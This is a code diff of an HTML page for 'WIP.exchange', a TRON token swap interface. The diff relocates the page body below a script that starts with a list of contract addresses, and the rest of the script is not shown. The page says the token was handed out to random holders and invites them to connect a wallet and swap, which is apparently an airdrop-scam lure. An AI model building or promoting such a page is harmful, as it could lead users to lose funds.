@@ -9,68 +9,6 @@
   <link href="https://wip.exchange/assets/css/theme.min.css" rel="stylesheet" type="text/css" media="all"> 
   <link href="https://wip.exchange/assets/css/customize.css" rel="stylesheet" type="text/css" media="all"> 
  </head> 
- <body class="bg-green-100 travel-template"> 
-  <header class="muse-header py-sm-2"> 
-   <div class="container"> 
-    <nav class="navbar"> 
-     <a class="navbar-brand text-dark" href="javascript:void(0);"> 🌟 <strong>WIP</strong>.exchange </a> 
-     <div style="text-align:center" class="float-right"> 
-      <span class="btn my-3 bg-white" disabled>Your wallet&nbsp;&nbsp;<span style="color: #4CA137;" class="Yourwallet">Not Connect</span> </span>
-     </div> 
-    </nav>
-   </div>
-  </header> 
-  <div class="container"> 
-   <section class="muse-section"> 
-    <p class="lead text-center text-muted"> WIP was distributed to random investors around the TRON network<br> </p> 
-    <div class="row justify-content-center"> 
-     <div class="col-lg-6"> 
-      <div class="my-3 travel-booking shadow-dark-80" style="margin: 0 auto;display: block;"> 
-       <div class="text-center my-3">
-        WIP Price 
-        <b>34 TRX</b>
-       </div> 
-       <div> 
-        <a href="#sellall" class="float-right">Sell All</a> Balance 
-        <b id="tokenBalance">0 WIP</b> 
-       </div> 
-       <div class="form-group form-customize padding-custom"> 
-        <label for="wrapped" style="margin-bottom: 8px;">From</label> 
-        <div class="input-group"> 
-         <input id="wrapped1" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"> 
-         <div class="input-group-addon"> 
-          <select class="form-control form-control-custom"> <option> TRX</option> <option selected>WIP</option> </select> 
-         </div> 
-        </div> 
-       </div> 
-       <img src="https://wip.exchange/assets/svg/brand/swap.svg" onclick="change()" height="20px" style="margin:0 auto;display: block;"> 
-       <div class="form-group form-customize padding-custom"> 
-        <label for="wrapped2" style="margin-bottom: 8px;">To</label> 
-        <div class="input-group"> 
-         <input id="wrapped2" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"> 
-         <div class="input-group-addon"> 
-          <select class="form-control form-control-custom"> <option> WIP</option> <option selected>TRX</option> </select> 
-         </div> 
-        </div> 
-       </div> 
-       <button onclick="swap()" class="btn btn-lg btn-warning ml-auto btn-custom">Swap</button> 
-      </div> 
-     </div> 
-    </div> 
-   </section> 
-  </div> 
-  <br>
-  <br>
-  <br> 
-  <footer class="bg-white pt-4 pt-md-5 pb-4 mt-4 mt-md-0"> 
-   <div class="container"> 
-    <div class="row justify-content-center"> 
-     <div class="col-sm-6 text-center"> 
-      <p class="small text-gray-600 text-center">2021 WIP.exchange. All rights reserved.</p> 
-     </div> 
-    </div> 
-   </div> 
-  </footer> 
   <script>
     var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                             "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
@@ -225,5 +163,68 @@
 
 
 </script> 
+ <body class="bg-green-100 travel-template"> 
+  <header class="muse-header py-sm-2"> 
+   <div class="container"> 
+    <nav class="navbar"> 
+     <a class="navbar-brand text-dark" href="javascript:void(0);"> 🌟 <strong>WIP</strong>.exchange </a> 
+     <div style="text-align:center" class="float-right"> 
+      <span class="btn my-3 bg-white" disabled>Your wallet&nbsp;&nbsp;<span style="color: #4CA137;" class="Yourwallet">Not Connect</span> </span>
+     </div> 
+    </nav>
+   </div>
+  </header> 
+  <div class="container"> 
+   <section class="muse-section"> 
+    <p class="lead text-center text-muted"> WIP was distributed to random investors around the TRON network<br> </p> 
+    <div class="row justify-content-center"> 
+     <div class="col-lg-6"> 
+      <div class="my-3 travel-booking shadow-dark-80" style="margin: 0 auto;display: block;"> 
+       <div class="text-center my-3">
+        WIP Price 
+        <b>34 TRX</b>
+       </div> 
+       <div> 
+        <a href="#sellall" class="float-right">Sell All</a> Balance 
+        <b id="tokenBalance">0 WIP</b> 
+       </div> 
+       <div class="form-group form-customize padding-custom"> 
+        <label for="wrapped" style="margin-bottom: 8px;">From</label> 
+        <div class="input-group"> 
+         <input id="wrapped1" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"> 
+         <div class="input-group-addon"> 
+          <select class="form-control form-control-custom"> <option> TRX</option> <option selected>WIP</option> </select> 
+         </div> 
+        </div> 
+       </div> 
+       <img src="https://wip.exchange/assets/svg/brand/swap.svg" onclick="change()" height="20px" style="margin:0 auto;display: block;"> 
+       <div class="form-group form-customize padding-custom"> 
+        <label for="wrapped2" style="margin-bottom: 8px;">To</label> 
+        <div class="input-group"> 
+         <input id="wrapped2" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"> 
+         <div class="input-group-addon"> 
+          <select class="form-control form-control-custom"> <option> WIP</option> <option selected>TRX</option> </select> 
+         </div> 
+        </div> 
+       </div> 
+       <button onclick="swap()" class="btn btn-lg btn-warning ml-auto btn-custom">Swap</button> 
+      </div> 
+     </div> 
+    </div> 
+   </section> 
+  </div> 
+  <br>
+  <br>
+  <br> 
+  <footer class="bg-white pt-4 pt-md-5 pb-4 mt-4 mt-md-0"> 
+   <div class="container"> 
+    <div class="row justify-content-center"> 
+     <div class="col-sm-6 text-center"> 
+      <p class="small text-gray-600 text-center">2021 WIP.exchange. All rights reserved.</p> 
+     </div> 
+    </div> 
+   </div> 
+  </footer> 
+
  </body>
 </html>
